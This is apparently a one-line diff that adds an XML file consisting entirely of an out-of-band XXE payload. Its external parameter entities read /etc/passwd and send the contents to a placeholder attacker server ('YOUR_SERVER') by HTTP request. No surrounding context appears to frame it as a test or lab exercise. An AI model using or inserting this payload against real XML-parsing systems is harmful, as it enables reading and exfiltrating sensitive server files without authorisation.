@@ -1,0 +1,1 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd"><!ENTITY % e "<!ENTITY &#x25; s SYSTEM 'http://YOUR_SERVER/?d=%f;'>">%e;%s;]><r>t</r>
